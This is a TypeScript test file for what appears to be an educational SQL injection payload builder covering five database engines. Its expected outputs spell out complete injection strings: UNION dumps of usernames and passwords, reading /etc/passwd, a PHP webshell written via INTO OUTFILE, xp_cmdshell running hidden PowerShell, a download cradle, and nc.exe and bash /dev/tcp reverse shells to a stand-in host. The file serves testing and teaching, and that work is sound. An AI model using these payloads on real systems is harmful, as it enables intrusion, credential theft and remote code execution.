import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
import { buildSql, SQL_ENGINES, SQL_EXEC, SQL_STEPS, sqlExecIds, type SqlEngine, type SqlPoint } from "../../../engines/payloads/sql";
import { sqlSkeleton } from "../../../engines/payloads/sqlKeywords";

const V = { LHOST: "192.0.2.10", LPORT: "443", columns: 3, reflected: 2, table: "users", column: "username,password", path: "/var/www/html/x.php" };
const dec = (s: string) => decodeURIComponent(s.replace(/\+/g, " "));

describe("buildSql", () => {
  it("column-count for mysql url-param is ' ORDER BY 1-- - encoded", () => {
    const b = buildSql("column-count", "mysql", "url-param", {});
    expect(b.text).toBe("%27+ORDER+BY+1--+-");
    expect(dec(b.text)).toBe("' ORDER BY 1-- -");
  });

  it("time detect uses the engine's sleep", () => {
    const want: Record<SqlEngine, string> = {
      mssql: "WAITFOR DELAY '0:0:5'", mysql: "SLEEP(5)", postgres: "pg_sleep(5)",
      oracle: "dbms_pipe.receive_message('a',5)", sqlite: "RANDOMBLOB",
    };
    for (const e of SQL_ENGINES) expect(dec(buildSql("detect-time", e, "url-param", {}).text)).toContain(want[e]);
  });

  it("oracle UNION includes FROM dual", () => {
    expect(dec(buildSql("reflected-columns", "oracle", "url-param", { columns: 3 }).text)).toContain("FROM dual");
    expect(dec(buildSql("version", "oracle", "form-field", { columns: 3, reflected: 2 }).text)).toContain("FROM v$version");
  });

  it("missing columns stay visible and unresolved", () => {
    const b = buildSql("tables", "mysql", "form-field", {});
    expect(b.unresolved).toContain("COLUMNS");
    expect(b.text).toContain("{COLUMNS}");
  });

  it("form-field is raw with default quote break; prefix overrides", () => {
    expect(buildSql("detect-boolean", "mysql", "form-field", {}).text).toBe("' AND 1=1-- -");
    expect(buildSql("detect-boolean", "mysql", "form-field", { prefix: "" }).text).toBe("AND 1=1-- -");
  });

  it("joins strings per engine", () => {
    const row = (e: SqlEngine) => buildSql("rows", e, "form-field", V).text;
    expect(row("mssql")).toContain("username+':'+password");
    expect(row("mysql")).toContain("CONCAT(username,':',password)");
    expect(row("postgres")).toContain("username||':'||password");
  });

  it("postgres-copy-program in url-param matches the lab form", () => {
    const t = buildSql("postgres-copy-program", "postgres", "url-param", V).text;
    expect(t).toContain("COPY");
    expect(t).toContain("FROM+PROGRAM");
    expect(t).toContain("bash+-c");
    expect(t).toContain("%3E%26");
    expect(t).not.toContain(">&");
    expect(dec(t)).toContain(`PROGRAM 'bash -c "bash -i >& /dev/tcp/192.0.2.10/443 0>&1"'`);
  });

  it("mssql-xp_cmdshell embeds ps-b64 by default", () => {
    const b = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V);
    expect(b.text).toMatch(/^'; EXEC xp_cmdshell 'powershell -nop -w hidden -e [A-Za-z0-9+/=]+';-- -$/);
    expect(b.listener).toBe("penelope -O -p 443");
  });

  it("mssql-xp_cmdshell with the nishang cradle doubles quotes, then URL-encodes", () => {
    const form = buildSql("mssql-xp_cmdshell", "mssql", "form-field", { ...V, shell: "nishang-cradle" });
    expect(form.text).toContain(`DownloadString(''http://192.0.2.10/rev.ps1'')`);
    const url = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { ...V, shell: "nishang-cradle" });
    expect(url.text).toContain("DownloadString(%27%27http");
    expect(dec(url.text)).toBe(form.text);
    expect(url.prepare).toBe(buildPayload(REVERSE_SHELLS.find((d) => d.id === "nishang-cradle")!, "cmd", { LHOST: V.LHOST, LPORT: V.LPORT }).prepare);
    expect(url.prepare).toContain("python3 -m http.server 80");
  });

  it("nc.exe flag is %2d only in url-param", () => {
    const url = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { ...V, shell: "nc-exe" });
    expect(url.text).toContain("+%2de+cmd.exe+192.0.2.10+443");
    expect(buildSql("mssql-xp_cmdshell", "mssql", "form-field", { ...V, shell: "nc-exe" }).text).toContain(" -e cmd.exe");
  });

  it("url-param keeps unresolved placeholders visible while braces in the data are encoded", () => {
    const b = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { LPORT: "443", shell: "nc-exe" });
    expect(b.unresolved).toEqual(["LHOST"]);
    expect(b.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+{LHOST}+443%27%3B--+-");
    expect(buildSql("mssql-xp_cmdshell", "mssql", "url-param", { cmd: "echo {x}" }).text).toContain("echo+%7Bx%7D");
  });

  it("missing LHOST goes to unresolved", () => {
    const b = buildSql("postgres-copy-program", "postgres", "form-field", { LPORT: "443" });
    expect(b.unresolved).toContain("LHOST");
    expect(b.text).toContain("{LHOST}");
  });

  it("client-session payloads have no leading quote and no encoding", () => {
    for (const [id, e] of [["version", "mssql"], ["tables", "mysql"], ["rows", "postgres"], ["mssql-xp_cmdshell", "mssql"], ["postgres-copy-program", "postgres"], ["detect-time", "mysql"]] as [string, SqlEngine][]) {
      const t = buildSql(id, e, "client-session", V).text;
      expect(t, id).not.toMatch(/^'/);
      expect(t, id).not.toContain("%");
      expect(t, id).not.toMatch(/-- -$/);
      expect(t, id).not.toContain("UNION");
    }
    expect(buildSql("version", "mssql", "client-session", {}).text).toBe("SELECT @@version");
    expect(buildSql("mssql-xp_cmdshell", "mssql", "client-session", V).text).toMatch(/^EXEC xp_cmdshell /);
  });

  it("injection-only steps are not applicable in a session", () => {
    expect(() => buildSql("column-count", "mysql", "client-session", {})).toThrow(/session/);
  });

  it("exec ids on the wrong engine throw; helper lists per engine", () => {
    expect(() => buildSql("mssql-xp_cmdshell", "mysql", "url-param", V)).toThrow(/mssql/);
    expect(() => buildSql("nope", "mysql", "url-param", V)).toThrow(/Unknown/);
    expect(sqlExecIds("mssql")).toEqual(["mssql-enable-xp_cmdshell", "mssql-xp_cmdshell", "mssql-read-file"]);
    expect(sqlExecIds("mysql")).toEqual(["mysql-into-outfile-webshell", "mysql-load-file"]);
    expect(sqlExecIds("postgres")).toEqual(["postgres-copy-program"]);
    expect(sqlExecIds("oracle")).toEqual([]);
  });

  it("steps are in walkthrough order", () => {
    expect(SQL_STEPS.map((s) => s.id)).toEqual(["detect-error", "detect-boolean", "detect-time", "column-count", "reflected-columns", "version", "databases", "tables", "columns", "rows"]);
    for (const s of SQL_STEPS) expect(s.title && s.explain).toBeTruthy();
    for (const x of SQL_EXEC) expect(x.title && x.explain).toBeTruthy();
  });

  it("every step and exec has parts explaining each SQL keyword it uses", () => {
    const KEYWORDS = ["UNION", "SELECT", "NULL", "ORDER BY", "WAITFOR DELAY", "SLEEP", "pg_sleep", "dbms_pipe.receive_message", "RANDOMBLOB", "FROM dual", "WHERE", "information_schema", "GROUP_CONCAT", "CONCAT", "EXEC", "sp_configure", "RECONFIGURE", "xp_cmdshell", "COPY", "FROM PROGRAM", "INTO OUTFILE", "LOAD_FILE", "OPENROWSET", "BULK", "SINGLE_CLOB", "BulkColumn", "AND 1=1", "AND 1=2", "string_agg", "::text", "LISTAGG", "WITHIN GROUP", "FOR XML PATH", "owner=USER", "FROM DUAL", "sqlite_master", "v$version", "@@version", "version()", "sqlite_version()", "database()", "pg_database", "all_tables", "all_users", "sys.databases", "||", "-- -"];
    const ids = [...SQL_STEPS.map((s) => s.id), ...SQL_EXEC.map((x) => x.id)];
    let checked = 0;
    for (const id of ids) {
      for (const e of SQL_ENGINES) {
        for (const p of ["url-param", "form-field", "client-session"] as SqlPoint[]) {
          let b;
          try { b = buildSql(id, e, p, V); } catch { continue; }
          expect(b.parts.length, `${id}/${e}/${p}`).toBeGreaterThan(0);
          // Keywords in the SQL itself (string literals hold data: a command, a path, a label).
          const text = p === "url-param" ? dec(b.text) : b.text;
          const raw = sqlSkeleton(p === "client-session" ? text : text.slice(1)); // after the ' break
          for (const k of KEYWORDS) {
            if (raw.includes(k)) {
              expect(b.parts.some((x) => x.token.includes(k)), `${id}/${e}/${p}: ${k}`).toBe(true);
              checked++;
            }
          }
        }
      }
    }
    expect(checked).toBeGreaterThan(150);
  });

  it("nc-exe url-param is complete: default path, %2d flag, no unresolved", () => {
    const b = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { LHOST: "192.0.2.10", LPORT: "443", shell: "nc-exe" });
    expect(b.unresolved).toEqual([]);
    expect(b.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+192.0.2.10+443%27%3B--+-");
  });

  it("postgres-copy-program creates its table first", () => {
    const b = buildSql("postgres-copy-program", "postgres", "form-field", { ...V, table: "cmd_exec" });
    expect(b.text).toMatch(/^'; CREATE TABLE IF NOT EXISTS cmd_exec\(cmd_output text\); COPY cmd_exec FROM PROGRAM /);
    expect(b.parts.some((p) => p.token === "CREATE TABLE")).toBe(true);
  });

  it("reflected-columns labels one column on strict engines, all on mysql", () => {
    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3, reflected: 2 }).text).toBe("' AND 1=2 UNION SELECT NULL,'c2',NULL-- -");
    expect(buildSql("reflected-columns", "mssql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL,NULL-- -");
    expect(buildSql("reflected-columns", "oracle", "form-field", { columns: 2 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL FROM dual-- -");
    expect(buildSql("reflected-columns", "mysql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1','c2','c3'-- -");
    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3 }).notes.join(" ")).toMatch(/once per column/);
  });

  it("embedded shell parts are explained", () => {
    const ps = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V).parts.map((p) => p.token).join("|");
    expect(ps).toContain("-nop");
    expect(ps).toContain("-e");
    const pg = buildSql("postgres-copy-program", "postgres", "form-field", V).parts.map((p) => p.token).join("|");
    expect(pg).toContain("bash -i");
    expect(pg).toContain("/dev/tcp");
  });

  it("detect-error never returns an empty payload", () => {
    const b = buildSql("detect-error", "mysql", "form-field", { prefix: "" });
    expect(b.text).toBe("'");
    expect(b.notes.join(" ")).toMatch(/Numeric context/);
  });

  describe("pre-lab SQL fixes", () => {
    const tokens = (b: { parts: { token: string }[] }) => b.parts.map((p) => p.token);
    const explain = (b: { parts: { token: string; explain: string }[] }, t: string) => b.parts.find((p) => p.token === t)?.explain ?? "";

    it("MSSQL listings explain +, and the CONCAT remark is MySQL's", () => {
      const b = buildSql("tables", "mssql", "form-field", V);
      expect(b.text).toMatch(/\w\+' \| '/);
      expect(b.parts.find((p) => p.token === "+")?.explain).toBe("MSSQL joins strings with +.");
      expect(explain(buildSql("rows", "mysql", "form-field", V), "CONCAT")).toMatch(/MySQL.*there \+ would do arithmetic/);
    });

    it("CONCAT( does not match inside GROUP_CONCAT(", () => {
      const one = buildSql("rows", "mysql", "form-field", { ...V, column: "username" });
      expect(one.text).toBe("' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(username SEPARATOR ' | '),NULL FROM users-- -");
      expect(tokens(one)).not.toContain("CONCAT");
      expect(tokens(buildSql("tables", "mysql", "form-field", V))).not.toContain("CONCAT");
      expect(tokens(buildSql("rows", "mysql", "form-field", V))).toEqual(expect.arrayContaining(["GROUP_CONCAT", "CONCAT"]));
    });

    it("the keyword scan reads the SQL skeleton, not a custom cmd, base64 or a path", () => {
      const cmd = buildSql("mssql-xp_cmdshell", "mssql", "form-field", { cmd: "echo UNION SELECT NULL FROM x AS y WHERE 1=1 # ORDER BY 1" });
      expect(cmd.text).toBe("'; EXEC xp_cmdshell 'echo UNION SELECT NULL FROM x AS y WHERE 1=1 # ORDER BY 1';-- -");
      expect(tokens(cmd)).toEqual(["'", ";", "EXEC", "xp_cmdshell", "-- -"]);
      const pg = buildSql("postgres-copy-program", "postgres", "client-session", { table: "cmd_exec", cmd: "echo NULL AS x FROM y" });
      expect(tokens(pg)).toEqual(["CREATE TABLE", "COPY", "FROM PROGRAM"]);
      const b64 = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V);
      for (const t of ["NULL", "AS", "FROM", "UNION", "SELECT", "WHERE", "#", "||"]) expect(tokens(b64), t).not.toContain(t);
      const file = buildSql("mysql-load-file", "mysql", "form-field", { ...V, path: "/srv/a AS b/#/x" });
      expect(tokens(file)).toEqual(["'", "AND 1=2", "UNION", "SELECT", "NULL", "LOAD_FILE", "-- -"]);
    });

    it("explanations mention the leading ; only for a stacked injection", () => {
      const inj = buildSql("detect-time", "mssql", "form-field", {});
      expect(explain(inj, "WAITFOR DELAY")).toMatch(/leading ;/);
      const ses = buildSql("detect-time", "mssql", "client-session", {});
      expect(explain(ses, "WAITFOR DELAY")).toBe("MSSQL: pause for h:m:s ('0:0:5' = 5 seconds).");
      for (const id of ["mssql-enable-xp_cmdshell", "mssql-xp_cmdshell"]) {
        const b = buildSql(id, "mssql", "client-session", V);
        expect(explain(b, "EXEC"), id).toBe("MSSQL: runs a stored procedure.");
        expect(b.notes.join(" "), id).not.toMatch(/stacked|leading ;/);
      }
      expect(buildSql("postgres-copy-program", "postgres", "client-session", V).notes.join(" ")).not.toMatch(/stacked/);
      expect(buildSql("mysql-load-file", "mysql", "client-session", V).notes.join(" ")).not.toMatch(/shown column/);
      expect(explain(buildSql("detect-time", "mysql", "client-session", {}), "SLEEP")).toBe("MySQL: sleep for 5 seconds.");
      expect(explain(buildSql("mssql-xp_cmdshell", "mssql", "form-field", V), "EXEC")).toMatch(/stacked/);
      expect(buildSql("mssql-xp_cmdshell", "mssql", "form-field", V).notes.join(" ")).toMatch(/stacked queries/);
    });

    it("LOAD_FILE says it defaults to /etc/passwd only when no path is given", () => {
      const given = buildSql("mysql-load-file", "mysql", "form-field", V);
      expect(given.text).toBe("' AND 1=2 UNION SELECT NULL,LOAD_FILE('/var/www/html/x.php'),NULL-- -");
      expect(given.notes.join(" ")).not.toMatch(/Defaults to/);
      const none = buildSql("mysql-load-file", "mysql", "form-field", { columns: 3, reflected: 2 });
      expect(none.text).toBe("' AND 1=2 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -");
      expect(none.notes.join(" ")).toMatch(/Defaults to \/etc\/passwd/);
      expect(buildSql("mssql-read-file", "mssql", "form-field", { columns: 3, reflected: 2 }).notes.join(" ")).toMatch(/Defaults to C:\\Windows\\win\.ini/);
      expect(buildSql("mssql-read-file", "mssql", "form-field", { ...V, path: "C:\\x.txt" }).notes.join(" ")).not.toMatch(/Defaults to/);
    });

    it("INTO OUTFILE checks the shown column against the column count", () => {
      expect(() => buildSql("mysql-into-outfile-webshell", "mysql", "form-field", { ...V, columns: 3, reflected: 4 })).toThrow(/beyond 3 columns/);
      expect(() => buildSql("mysql-into-outfile-webshell", "mysql", "form-field", { ...V, reflected: 0 })).toThrow(/reflected column 0/);
      expect(buildSql("mysql-into-outfile-webshell", "mysql", "form-field", V).text).toBe(`' AND 1=2 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/x.php'-- -`);
    });

    it("nc.exe typed as a custom cmd gets the %2d flag in a URL too; other -e flags do not", () => {
      const custom = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { cmd: "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443" });
      expect(custom.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+192.0.2.10+443%27%3B--+-");
      expect(buildSql("mssql-xp_cmdshell", "mssql", "url-param", { cmd: "nc64.exe -e cmd.exe 192.0.2.10 443" }).text).toContain("nc64.exe+%2de+cmd.exe");
      expect(buildSql("mssql-xp_cmdshell", "mssql", "url-param", { cmd: "powershell -e AAAA" }).text).toContain("powershell+-e+AAAA");
      expect(buildSql("mssql-xp_cmdshell", "mssql", "form-field", { cmd: "nc.exe -e cmd.exe 192.0.2.10 443" }).text).toContain("nc.exe -e cmd.exe");
    });

    it("database, table and column listings aggregate into the shown column per engine", () => {
      const want: Record<string, Record<SqlEngine, string>> = {
        databases: {
          mysql: "' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(schema_name SEPARATOR ' | '),NULL FROM information_schema.schemata-- -",
          mssql: "' AND 1=2 UNION SELECT NULL,(SELECT name+' | ' FROM sys.databases FOR XML PATH('')),NULL-- -",
          postgres: "' AND 1=2 UNION SELECT NULL,string_agg(datname::text,' | '),NULL FROM pg_database-- -",
          oracle: "' AND 1=2 UNION SELECT NULL,LISTAGG(username,' | ') WITHIN GROUP (ORDER BY username),NULL FROM all_users-- -",
          sqlite: "' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(name,' | '),NULL FROM pragma_database_list-- -",
        },
        tables: {
          mysql: "' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ' | '),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
          mssql: "' AND 1=2 UNION SELECT NULL,(SELECT table_name+' | ' FROM information_schema.tables FOR XML PATH('')),NULL-- -",
          postgres: "' AND 1=2 UNION SELECT NULL,string_agg(table_name::text,' | '),NULL FROM information_schema.tables WHERE table_schema='public'-- -",
          oracle: "' AND 1=2 UNION SELECT NULL,LISTAGG(table_name,' | ') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables WHERE owner=USER-- -",
          sqlite: "' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(name,' | '),NULL FROM sqlite_master WHERE type='table'-- -",
        },
        columns: {
          mysql: "' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR ' | '),NULL FROM information_schema.columns WHERE table_name='users'-- -",
          mssql: "' AND 1=2 UNION SELECT NULL,(SELECT column_name+' | ' FROM information_schema.columns WHERE table_name='users' FOR XML PATH('')),NULL-- -",
          postgres: "' AND 1=2 UNION SELECT NULL,string_agg(column_name::text,' | '),NULL FROM information_schema.columns WHERE table_name='users'-- -",
          oracle: "' AND 1=2 UNION SELECT NULL,LISTAGG(column_name,' | ') WITHIN GROUP (ORDER BY column_id),NULL FROM all_tab_columns WHERE table_name='USERS'-- -",
          sqlite: "' AND 1=2 UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'-- -",
        },
      };
      for (const [id, byEngine] of Object.entries(want)) for (const e of SQL_ENGINES) {
        const b = buildSql(id, e, "form-field", V);
        expect(b.text, `${id}/${e}`).toBe(byEngine[e]);
        expect(dec(buildSql(id, e, "url-param", V).text), `${id}/${e} url`).toBe(byEngine[e]);
      }
      expect(buildSql("tables", "mssql", "form-field", V).notes.join(" ")).toMatch(/2005 and later/);
      expect(buildSql("tables", "oracle", "form-field", V).notes.join(" ")).toMatch(/ORA-01489/);
      expect(buildSql("tables", "mysql", "form-field", V).notes.join(" ")).toMatch(/1024 characters/);
    });

    it("in a client session the listings are plain SELECTs (the client prints every row)", () => {
      const want: Record<SqlEngine, string> = {
        mysql: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        mssql: "SELECT table_name FROM information_schema.tables",
        postgres: "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        oracle: "SELECT table_name FROM all_tables WHERE owner=USER",
        sqlite: "SELECT name FROM sqlite_master WHERE type='table'",
      };
      for (const e of SQL_ENGINES) expect(buildSql("tables", e, "client-session", V).text, e).toBe(want[e]);
      expect(buildSql("databases", "mssql", "client-session", {}).text).toBe("SELECT name FROM sys.databases");
      expect(buildSql("columns", "oracle", "client-session", V).text).toBe("SELECT column_name FROM all_tab_columns WHERE table_name='USERS'");
    });

    it("MySQL's plain boolean test has FROM DUAL (5.7); other engines are unchanged", () => {
      const want: Record<SqlEngine, string> = {
        mysql: "SELECT 1 FROM DUAL WHERE 1=1", oracle: "SELECT 1 FROM dual WHERE 1=1",
        mssql: "SELECT 1 WHERE 1=1", postgres: "SELECT 1 WHERE 1=1", sqlite: "SELECT 1 WHERE 1=1",
      };
      for (const e of SQL_ENGINES) expect(buildSql("detect-boolean", e, "client-session", {}).text, e).toBe(want[e]);
      expect(tokens(buildSql("detect-boolean", "mysql", "client-session", {}))).toEqual(["SELECT", "FROM DUAL", "WHERE"]);
    });

    it("Oracle's dbms_pipe sleep notes the EXECUTE grant", () => {
      for (const p of ["form-field", "client-session"] as SqlPoint[]) expect(buildSql("detect-time", "oracle", p, {}).notes.join(" "), p).toMatch(/EXECUTE on DBMS_PIPE/);
      expect(buildSql("detect-time", "mysql", "form-field", {}).notes.join(" ")).not.toMatch(/DBMS_PIPE/);
    });

    it("reflected-columns with no column count asks for it on every engine instead of a dead label note", () => {
      const want: Record<SqlEngine, string> = {
        mssql: "' AND 1=2 UNION SELECT {COLUMNS}-- -", postgres: "' AND 1=2 UNION SELECT {COLUMNS}-- -",
        oracle: "' AND 1=2 UNION SELECT {COLUMNS} FROM dual-- -", mysql: "' AND 1=2 UNION SELECT {COLUMNS}-- -", sqlite: "' AND 1=2 UNION SELECT {COLUMNS}-- -",
      };
      for (const e of SQL_ENGINES) {
        const b = buildSql("reflected-columns", e, "form-field", { reflected: 2 });
        expect(b.text, e).toBe(want[e]);
        expect(b.unresolved, e).toEqual(["COLUMNS"]);
        const n = b.notes.join(" ");
        expect(n, e).toMatch(/Fill in the column count first/);
        expect(n, e).not.toMatch(/labels only column/);
      }
      expect(buildSql("reflected-columns", "postgres", "form-field", {}).notes.join(" ")).toMatch(/one column at a time/);
      expect(buildSql("reflected-columns", "mysql", "form-field", {}).notes.join(" ")).not.toMatch(/one column at a time/);
    });

    it("every part token appears in the built text", () => {
      const meta = new Set(["(no prefix)"]);
      for (const id of [...SQL_STEPS.map((s) => s.id), ...SQL_EXEC.map((x) => x.id)]) for (const e of SQL_ENGINES) for (const p of ["url-param", "form-field", "client-session"] as SqlPoint[]) {
        let b;
        try { b = buildSql(id, e, p, V); } catch { continue; }
        const text = p === "url-param" ? dec(b.text) : b.text;
        for (const x of b.parts) if (!meta.has(x.token) && !x.decoded) expect(text, `${id}/${e}/${p}: ${x.token}`).toContain(x.token);
      }
    });

    it("client-session steps skip the UNION machinery: no COLUMNS to fill, no stale reflected check", () => {
      for (const id of ["version", "databases", "tables", "columns", "rows", "mysql-load-file", "mssql-read-file"]) for (const e of SQL_ENGINES) {
        let b;
        try { b = buildSql(id, e, "client-session", { table: "users", column: "username" }); } catch (err) { if (/applies to/.test((err as Error).message)) continue; throw err; }
        expect(b.unresolved, `${id}/${e}`).not.toContain("COLUMNS");
        expect(b.text, `${id}/${e}`).not.toContain("{COLUMNS}");
        expect(() => buildSql(id, e, "client-session", { table: "users", column: "username", columns: 3, reflected: 5 }), `${id}/${e}`).not.toThrow();
      }
      expect(buildSql("version", "oracle", "client-session", {}).text).toBe("SELECT banner FROM v$version");
      expect(() => buildSql("version", "mysql", "form-field", { columns: 3, reflected: 5 })).toThrow(/beyond 3 columns/);
    });

    it("MySQL's # comment is a note, not a part", () => {
      const b = buildSql("detect-boolean", "mysql", "url-param", {});
      expect(tokens(b)).not.toContain("# (alternative)");
      expect(b.notes.join(" ")).toMatch(/MySQL also accepts # as the comment; send it as %23 in a URL/);
      expect(buildSql("detect-boolean", "mysql", "client-session", {}).notes.join(" ")).not.toMatch(/%23/);
      expect(buildSql("detect-boolean", "postgres", "url-param", {}).notes.join(" ")).not.toMatch(/%23/);
    });

    it("FOR XML PATH and ::text explanations", () => {
      expect(explain(buildSql("tables", "postgres", "form-field", V), "::text")).toBe("PostgreSQL: cast to text so string_agg gets a plain string whatever the catalogue column type.");
      expect(explain(buildSql("tables", "mssql", "form-field", V), "FOR XML PATH")).toMatch(/2005 and later/);
    });
  });
});
